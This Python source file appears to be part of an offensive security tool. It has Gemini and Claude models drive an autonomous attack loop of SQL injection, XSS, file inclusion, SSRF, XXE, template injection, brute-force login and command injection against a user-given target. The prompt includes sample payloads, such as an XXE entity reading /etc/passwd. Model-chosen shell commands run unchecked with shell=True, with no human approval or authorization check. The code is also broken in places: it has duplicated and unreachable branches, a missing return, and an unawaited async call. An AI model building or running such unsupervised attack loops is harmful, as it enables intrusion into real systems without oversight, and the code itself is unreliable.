        nuclei_command = ["nuclei", "-u", self.target, "-t", "cves/,vulnerabilities/,technologies/"]
        scan_results['nuclei'] = self._run_command(nuclei_command, "nuclei_scan.txt")
        
        self._log("--- Finished Phase 1: Information Gathering ---")
        return scan_results

# =================================================================================
# 3. AI-Driven Analysis and Attack
# =================================================================================

    def _get_ai_response(self, ai_model_name, prompt, conversation_history):
        """Gets a response from the specified AI model, with resilience."""
        if ai_model_name == 'gemini' and self.gemini_model and self.gemini_failures < self.max_failures:
            try:
                # Gemini's API is stateless in this context, so we prepend history to the prompt
                full_prompt = "\n".join(conversation_history + [prompt])
                response = self.gemini_model.generate_content(full_prompt)
                self.gemini_failures = 0 # Reset on success
                return response.text
            except Exception as e:
                self._log(f"[ERROR] Gemini API call failed: {e}")
                self.gemini_failures += 1
                if self.gemini_failures >= self.max_failures:
                    self._log("[CRITICAL] Gemini has failed too many times. Disabling for this session.")
                return None
        
        elif ai_model_name == 'claude' and self.claude_model and self.claude_failures < self.max_failures:
            try:
                # Claude's API can handle conversation history
                messages = []
                for i, message in enumerate(conversation_history):
                    role = "user" if i % 2 == 0 else "assistant"
                    messages.append({"role": role, "content": message})
                messages.append({"role": "user", "content": prompt})
                
                response = self.claude_model.messages.create(
                    model="claude-3-haiku-20240307",
                    max_tokens=4096,
                    messages=messages
                )
                self.claude_failures = 0 # Reset on success
                return response.content[0].text
            except Exception as e:
                self._log(f"[ERROR] Claude API call failed: {e}")
                self.claude_failures += 1
                if self.claude_failures >= self.max_failures:
                    self._log("[CRITICAL] Claude has failed too many times. Disabling for this session.")
                return None
        
        return None

    async def _execute_internal_function_call(self, call_string):
        """
        Executes an internal Python function call suggested by the AI.
        Expected format: "INTERNAL_FUNC:function_name({'arg_name': 'val', ...})"
        """
        try:
            self._log(f"[AI] Attempting internal function call: {call_string}")
            func_part, args_part = call_string.split(':', 1)[1].strip().split('(', 1)
            func_name = func_part.strip()
            args_str = args_part.rstrip(')')

            args = {}
            if args_str:
                # Attempt to parse as JSON first (for dict-like arguments)
                try:
                    # JSON strings in AI response might use single quotes or not be perfectly
                    # formatted, so a pre-processing step is helpful.
                    cleaned_args_str = args_str.replace("'", '"')
                    args = json.loads(cleaned_args_str)
                except json.JSONDecodeError:
                    self._log(f"[WARNING] Could not parse args as JSON: {args_str}. Attempting kwarg parsing.")
                    # Fallback to simple kwarg parsing if not JSON (less robust)
                    for arg_pair in args_str.split(', '):
                        if '=' in arg_pair:
                            key, value = arg_pair.split('=', 1)
                            args[key.strip()] = value.strip().strip("'\"") # Remove quotes
                        elif arg_pair.strip(): # Handle single unkeyed argument
                            args['value'] = arg_pair.strip().strip("'\"")


            if func_name == "perform_sqli_attack":
                 # Pass the current target from the runner, and other args from AI
                sqli_results = perform_sqli_attack(
                    target_url=args.get("target_url", self.target), # Allow AI to specify, default to runner's target
                    method=args.get("method", "GET"),
                    data=args.get("data"),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 10),
                    verify_ssl=args.get("verify_ssl", True)
                )
                if sqli_results:
                    for finding in sqli_results:
                        self.report_generator.add_finding(finding) # Add findings to report
                    self._log(f"[SUCCESS] SQL Injection scan completed. Found {len(sqli_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": sqli_results})
                else:
                    self._log("[INFO] SQL Injection scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No SQL Injection vulnerabilities found."})

            elif func_name == "perform_xss_attack":
                xss_results = perform_xss_attack(
                    target_url=args.get("target_url", self.target),
                    method=args.get("method", "GET"),
                    data=args.get("data"),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 10),
                    verify_ssl=args.get("verify_ssl", True)
                )
                if xss_results:
                    for finding in xss_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] XSS scan completed. Found {len(xss_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": xss_results})
                else:
                    self._log("[INFO] XSS scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No XSS vulnerabilities found."})

            elif func_name == "perform_lfi_rfi_attack":
                lfi_rfi_results = perform_lfi_rfi_attack(
                    target_url=args.get("target_url", self.target),
                    method=args.get("method", "GET"),
                    data=args.get("data"),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 10),
                    verify_ssl=args.get("verify_ssl", True)
                )
                if lfi_rfi_results:
                    for finding in lfi_rfi_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] LFI/RFI scan completed. Found {len(lfi_rfi_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": lfi_rfi_results})
                else:
                    self._log("[INFO] LFI/RFI scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No LFI/RFI vulnerabilities found."})

            elif func_name == "perform_ssrf_attack":
                ssrf_results = perform_ssrf_attack(
                    target_url=args.get("target_url", self.target),
                    method=args.get("method", "GET"),
                    data=args.get("data"),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 10),
                    verify_ssl=args.get("verify_ssl", True)
                )
                if ssrf_results:
                    for finding in ssrf_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] SSRF scan completed. Found {len(ssrf_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": ssrf_results})
                else:
                    self._log("[INFO] SSRF scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No SSRF vulnerabilities found."})

            elif func_name == "perform_exposed_services_attack":
                # For exposed services, we don't have method/data/headers/cookies in the same way
                # as web attacks. The function directly uses asyncio.open_connection.
                # We pass the runner's target, and the runner's report_generator and _log method.
                # We can pass self (the FullAIModeRunner instance) as 'output' and 'report'
                # because it has a _log method and a report_generator attribute.
                exposed_services_results = await perform_exposed_services_attack(
                    target=args.get("target", self.target),
                    output=self, # Pass self as output, it has _log method
                    report=self.report_generator,
                    session_cookies=args.get("session_cookies")
                )
                if exposed_services_results:
                    # The perform_exposed_services_attack function already adds findings to report_generator
                    self._log(f"[SUCCESS] Exposed Services scan completed. Found {len(exposed_services_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": exposed_services_results})
                else:
                    self._log("[INFO] Exposed Services scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No Exposed Services vulnerabilities found."})

            elif func_name == "perform_mongodb_attack":
                mongodb_results = await perform_mongodb_attack(
                    target=args.get("target", self.target),
                    output=self,
                    report=self.report_generator,
                    session_cookies=args.get("session_cookies")
                )
                if mongodb_results:
                    # The perform_mongodb_attack function already adds findings to report_generator
                    self._log(f"[SUCCESS] MongoDB scan completed. Found {len(mongodb_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": mongodb_results})
                else:
                    self._log("[INFO] MongoDB scan completed. No vulnerabilities found.")
            elif func_name == "perform_rtsp_attack":
                rtsp_results = await perform_rtsp_attack(
                    target=args.get("target", self.target),
                    output=self,
                    report=self.report_generator,
                    session_cookies=args.get("session_cookies")
                )
                if rtsp_results:
                    # The perform_rtsp_attack function already adds findings to report_generator
                    self._log(f"[SUCCESS] RTSP scan completed. Found {len(rtsp_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": rtsp_results})
                else:
                    self._log("[INFO] RTSP scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No RTSP vulnerabilities found."})

            elif func_name == "perform_graphql_injection_attack":
                graphql_results = await perform_graphql_injection_attack(
                    target=args.get("target", self.target),
                    output=self,
                    report=self.report_generator,
                    session_cookies=args.get("session_cookies")
                )
                if graphql_results:
                    # The perform_graphql_injection_attack function already adds findings to report_generator
                    self._log(f"[SUCCESS] GraphQL Injection scan completed. Found {len(graphql_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": graphql_results})
                else:
                    self._log("[INFO] GraphQL Injection scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No GraphQL Injection vulnerabilities found."})

            elif func_name == "perform_rtsp_attack":
                rtsp_results = await perform_rtsp_attack(
                    target=args.get("target", self.target),
                    output=self,
                    report=self.report_generator,
                    session_cookies=args.get("session_cookies")
                )
                if rtsp_results:
                    # The perform_rtsp_attack function already adds findings to report_generator
                    self._log(f"[SUCCESS] RTSP scan completed. Found {len(rtsp_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": rtsp_results})
                else:
                    self._log("[INFO] RTSP scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No RTSP vulnerabilities found."})
                if ssrf_results:
                    for finding in ssrf_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] SSRF scan completed. Found {len(ssrf_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": ssrf_results})
                else:
                    self._log("[INFO] SSRF scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No SSRF vulnerabilities found."})

            elif func_name == "perform_xxe_attack":
                xxe_results = perform_xxe_attack(
                    target_url=args.get("target_url", self.target),
                    method=args.get("method", "POST"), # XXE typically uses POST with XML body
                    data=args.get("data"),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 10),
                    verify_ssl=args.get("verify_ssl", True)
                )
                if xxe_results:
                    for finding in xxe_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] XXE scan completed. Found {len(xxe_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": xxe_results})
                else:
                    self._log("[INFO] XXE scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No XXE vulnerabilities found."})

            elif func_name == "perform_ssti_attack":
                ssti_results = perform_ssti_attack(
                    target_url=args.get("target_url", self.target),
                    method=args.get("method", "GET"),
                    data=args.get("data"),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 10),
                    verify_ssl=args.get("verify_ssl", True)
                )
                if ssti_results:
                    for finding in ssti_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] SSTI scan completed. Found {len(ssti_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": ssti_results})
                else:
                    self._log("[INFO] SSTI scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No SSTI vulnerabilities found."})

            elif func_name == "perform_brute_force_login":
                brute_force_results = perform_brute_force_login(
                    target_url=args.get("target_url", self.target),
                    login_path=args.get("login_path", "/login"), # Default login path
                    username_field=args.get("username_field", "username"),
                    password_field=args.get("password_field", "password"),
                    success_indicator=args.get("success_indicator", "Welcome"), # Default success indicator
                    method=args.get("method", "POST"),
                    usernames=args.get("usernames"),
                    passwords=args.get("passwords"),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 10),
                    verify_ssl=args.get("verify_ssl", True)
                )
                if brute_force_results:
                    for finding in brute_force_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] Brute Force Login scan completed. Found {len(brute_force_results)} successful logins.")
                    return json.dumps({"status": "success", "findings": brute_force_results})
                else:
                    self._log("[INFO] Brute Force Login scan completed. No successful logins found.")
                    return json.dumps({"status": "info", "message": "No successful logins found."})
            
            elif func_name == "perform_http_smuggling_attack":
                smuggling_results = self._sync_perform_http_smuggling_attack(
                    target_url=args.get("target_url", self.target),
                    headers=args.get("headers"),
                    cookies=args.get("cookies"),
                    timeout=args.get("timeout", 15)
                )
                if smuggling_results:
                    for finding in smuggling_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] HTTP Smuggling scan completed. Found {len(smuggling_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": smuggling_results})
                else:
                    self._log("[INFO] HTTP Smuggling scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No HTTP Smuggling vulnerabilities found."})

            elif func_name == "perform_cmdi_attack":
                cmdi_results = await perform_cmdi_attack(
                    target=args.get("target", self.target),
                    form_to_test=args.get("form_to_test"),
                    output=self,
                    tech=args.get("tech", {}),
                    report=self.report_generator,
                    session_cookies=args.get("session_cookies"),
                    ai_enabled=True # Always enable AI for CMDi in full AI mode
                )
                if cmdi_results:
                    for finding in cmdi_results:
                        self.report_generator.add_finding(finding)
                    self._log(f"[SUCCESS] Command Injection scan completed. Found {len(cmdi_results)} potential vulnerabilities.")
                    return json.dumps({"status": "success", "findings": cmdi_results})
                else:
                    self._log("[INFO] Command Injection scan completed. No vulnerabilities found.")
                    return json.dumps({"status": "info", "message": "No Command Injection vulnerabilities found."})

            # Add other internal functions here as they are implemented
            else:
                self._log(f"[ERROR] Unknown internal function: {func_name}")
                return json.dumps({"status": "error", "message": f"Unknown internal function: {func_name}"})
        except Exception as e:
            self._log(f"[ERROR] Error executing internal function '{call_string}': {e}")
            return json.dumps({"status": "error", "message": f"Error executing internal function: {e}", "details": str(e)})

    def _run_ai_pentest(self, scan_results):
        """The main AI-driven attack loop."""
        self._log("--- Starting Phase 2: AI-Driven Attack ---")

        # Step 1: AI analyzes scan results to get attack plans
        attack_plans = ai_analyze_scan_results(scan_results)
        cve_attacks = attack_plans.get("cve_attacks", [])
        generic_attacks = attack_plans.get("generic_attacks", []) # Keep for later if AI doesn't explicitly call them

        # Step 2: Prioritize and execute CVE exploits
        if cve_attacks:
            self._log(f"[+] Identified {len(cve_attacks)} CVEs for exploitation: {', '.join(cve_attacks)}")
            for cve_id in cve_attacks:
                self._log(f"[+] Attempting to exploit CVE: {cve_id}")
                try:
                    # Call the synchronous wrapper for the async exploit_cve function
                    self._sync_exploit_cve(cve_id, self.target, "AI_Orchestrator")
                except Exception as e:
                    self._log(f"[ERROR] Failed to execute CVE exploit for {cve_id}: {e}")
                self._log(f"[+] Finished attempting exploit for CVE: {cve_id}")
        else:
            self._log("[INFO] No specific CVEs identified for exploitation.")

        # Step 3: Continue with AI-driven generic attack loop (existing logic)
        initial_prompt = f"""
You are an elite, autonomous penetration testing AI. Your goal is to find and exploit vulnerabilities in the target: {self.target}.
You will proceed step-by-step. At each step, you will be given the results of your previous action and must decide on the next one.
You can respond in two ways:
1. As a shell command to be executed. I will run the command and give you the output.
   Example: `nmap -sV {self.domain}` or `sqlmap -u "{self.target}/vuln.php?id=1" --dbs`.
2. As a call to an internal Python function. This allows for more precise and context-aware actions.
   The format for internal function calls is: `INTERNAL_FUNC:function_name({{arg1: val1, arg2: val2}}) `.
   Return only this string, no other text.

   Currently available internal functions:
   - `perform_sqli_attack({{target_url: str, method: str='GET', data: dict=None, headers: dict=None, cookies: dict=None}})`:
     Performs a comprehensive SQL Injection scan against the `target_url`.
     Use this function when you identify potential SQL Injection points or want to systematically test.
     Example: `INTERNAL_FUNC:perform_sqli_attack({{'target_url': '{self.target}/index.php', 'method': 'GET', 'data': {{'id': '1'}} }})`
   - `perform_xss_attack({{target_url: str, method: str='GET', data: dict=None, headers: dict=None, cookies: dict=None}})`:
     Performs a comprehensive Cross-Site Scripting (XSS) scan against the `target_url`.
     Use this function when you identify potential XSS reflection points or want to systematically test.
     Example: `INTERNAL_FUNC:perform_xss_attack({{'target_url': '{self.target}/search.php', 'method': 'GET', 'data': {{'q': 'test'}} }})`
   - `perform_lfi_rfi_attack({{target_url: str, method: str='GET', data: dict=None, headers: dict=None, cookies: dict=None}})`:
     Performs Local/Remote File Inclusion (LFI/RFI) attacks against the `target_url`.
     Use this function when you suspect file inclusion vulnerabilities.
     Example: `INTERNAL_FUNC:perform_lfi_rfi_attack({{'target_url': '{self.target}/view.php', 'method': 'GET', 'data': {{'file': 'index.php'}} }})`
   - `perform_ssrf_attack({{target_url: str, method: str='GET', data: dict=None, headers: dict=None, cookies: dict=None}})`:
     Performs Server-Side Request Forgery (SSRF) attacks against the `target_url`.
     Use this function when you identify potential SSRF points or want to systematically test.
     Example: `INTERNAL_FUNC:perform_ssrf_attack({{'target_url': '{self.target}/image_proxy.php', 'method': 'GET', 'data': {{'url': 'http://127.0.0.1/admin'}} }})`
   - `perform_xxe_attack({{target_url: str, method: str='POST', data: str=None, headers: dict=None, cookies: dict=None}})`:
     Performs XML External Entity (XXE) attacks against the `target_url`.
     Use this function when you suspect XML parsing vulnerabilities.
     Example: `INTERNAL_FUNC:perform_xxe_attack({{'target_url': '{self.target}/xml_parser.php', 'method': 'POST', 'data': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'}})`
   - `perform_ssti_attack({{target_url: str, method: str='GET', data: dict=None, headers: dict=None, cookies: dict=None}})`:
     Performs Server-Side Template Injection (SSTI) attacks against the `target_url`.
     Use this function when you suspect template injection vulnerabilities.
     Example: `INTERNAL_FUNC:perform_ssti_attack({{'target_url': '{self.target}/render', 'method': 'POST', 'data': {{'name': '{{2*2}}'}} }})`
   - `perform_brute_force_login({{target_url: str, login_path: str, username_field: str, password_field: str, success_indicator: str, method: str='POST', usernames: list=None, passwords: list=None, headers: dict=None, cookies: dict=None}})`:
     Performs brute-force login attempts against a login form.
     Use this function when you identify a login page and want to test for weak credentials.
     Example: `INTERNAL_FUNC:perform_brute_force_login({{'target_url': '{self.target}', 'login_path': '/login.php', 'username_field': 'user', 'password_field': 'pass', 'success_indicator': 'Welcome'}})`
   - `perform_cmdi_attack({{target: str, form_to_test: dict=None, tech: dict=None, session_cookies: dict=None}})`:
     Performs Command Injection attacks against the `target`.
     Use this function when you suspect command injection vulnerabilities.
     Example: `INTERNAL_FUNC:perform_cmdi_attack({{'target': '{self.target}'}})`

Do not provide any explanation, just the raw command OR the internal function call. Start with analysis and enumeration.
If you believe the test is complete or you cannot proceed, respond with the single word: "COMPLETE".

Here is the initial information from Nmap, Nikto, and Nuclei scans:

--- NMAP RESULTS ---
{scan_results.get('nmap', 'Not available.')}

--- NIKTO RESULTS ---
{scan_results.get('nikto', 'Not available.')}

--- NUCLEI RESULTS ---
{scan_results.get('nuclei', 'Not available.')}

Based on these results, what is your first command or internal function call?
"""
        
        gemini_history = []
        claude_history = []
        
        # Use a queue for thread-safe communication
        response_queue = queue.Queue()

        def get_gemini_command():
            response = self._get_ai_response('gemini', initial_prompt, gemini_history)
            response_queue.put(('gemini', response))

        def get_claude_command():
            response = self._get_ai_response('claude', initial_prompt, claude_history)
            response_queue.put(('claude', response))

        # Initial parallel requests
        threads = []
        if self.gemini_model:
            threads.append(threading.Thread(target=get_gemini_command))
        if self.claude_model:
            threads.append(threading.Thread(target=get_claude_command))
        
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        # Main loop
        for step in range(50): # Limit to 50 steps to prevent infinite loops
            self._log(f"--- AI Attack Step {step + 1} ---")
            
            # Process responses from the queue
            ai_responses = {}
            while not response_queue.empty():
                ai_name, response_content = response_queue.get()
                if response_content and response_content.strip().upper() != "COMPLETE":
                    ai_responses[ai_name] = response_content.strip()
                else:
                    self._log(f"AI model '{ai_name}' has completed its task.")
            
            if not ai_responses:
                self._log("All AI models have completed their tasks or failed. Ending pentest.")
                break

            commands_to_process = {}
            for ai_name, response_content in ai_responses.items():
                if response_content.startswith("INTERNAL_FUNC:"):
                    self._log(f"AI model '{ai_name}' requested internal function: {response_content}")
                    output = self._execute_internal_function_call(response_content)
                    commands_to_process[ai_name] = output # Feed output of internal function back to AI
                    self.report_generator.add_attack_log(step + 1, ai_name, "internal_function_call", response_content, output)
                else: # Assume it's a shell command
                    output = self._execute_shell_command(response_content, ai_name)
                    commands_to_process[ai_name] = output
                    self.report_generator.add_attack_log(step + 1, ai_name, "shell_command", response_content, output)

            # Update histories and get next commands
            next_threads = []
            
            def get_next_gemini(output):
                gemini_history.extend([ai_responses.get('gemini'), output])
                prompt = f"Your last action (command or internal function call) produced this output. What is your next command or internal function call?\n\n{output}"
                response = self._get_ai_response('gemini', prompt, gemini_history)
                response_queue.put(('gemini', response))

            def get_next_claude(output):
                claude_history.extend([ai_responses.get('claude'), output])
                prompt = f"Your last action (command or internal function call) produced this output. What is your next command or internal function call?\n\n{output}"
                response = self._get_ai_response('claude', prompt, claude_history)
                response_queue.put(('claude', response))
            
            if 'gemini' in commands_to_process:
                next_threads.append(threading.Thread(target=get_next_gemini, args=(commands_to_process['gemini'],)))
            if 'claude' in commands_to_process:
                next_threads.append(threading.Thread(target=get_next_claude, args=(commands_to_process['claude'],)))

            for t in next_threads:
                t.start()
            for t in next_threads:
                t.join()
        
        self._log("--- Finished Phase 2: AI-Driven Attack ---")

# Helper method moved outside main loop to consolidate
    def _execute_shell_command(self, command, ai_name):
        self._log(f"Executing shell command from {ai_name}: {command}")
        try:
            process = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='ignore',
                timeout=300
            )
            output = f"--- STDOUT ---\n{process.stdout}\n--- STDERR ---\n{process.stderr}"
            self._log(f"Output from {ai_name}'s command:\n{output}")
            return output
        except subprocess.TimeoutExpired:
            timeout_msg = "Command timed out after 5 minutes."
            self._log(f"[ERROR] {timeout_msg}")
            return timeout_msg
        except Exception as e:
            error_msg = f"An error occurred executing command: {e}"
            self._log(f"[ERROR] {error_msg}")
            return error_msg

# =================================================================================
# 4. Main Execution
# =================================================================================

    def run(self):
        """The main entry point for the Full AI Mode runner."""
        if not self._setup():
            return

        self._log("--- Initializing Full AI Mode ---")
        scan_results = self._run_scans()
        self._run_ai_pentest(scan_results)
        
        self._log("--- Full AI Mode Pentest Finished ---")
        self._log(f"The complete report is available at: {self.report_file}")
        self.report_generator.generate_report(os.path.join(self.output_dir, "penetration_test_report.md")) # Generate final report

def run_full_ai_mode(target, config_path):
    """Public function to be called from rap0at.py."""
    runner = FullAIModeRunner(target, config_path)
    runner.run()

if __name__ == '__main__':
    # This allows for direct execution of this script for testing purposes.
    print("Running full_ai_mode.py directly for testing...")
    
    # Create a dummy config for testing if it doesn't exist
    if not os.path.exists('config.ini'):
        print("Creating dummy config.ini for testing. Please add your API keys.")
        with open('config.ini', 'w') as f:
            f.write("[GEMINI]\napi_key = YOUR_GEMINI_API_KEY\n\n")
            f.write("[CLAUDE]\napi_key = YOUR_CLAUDE_API_KEY\n\n")
    
    test_target = input("Enter target URL for testing: ")
    if test_target:
        run_full_ai_mode(test_target, 'config.ini')
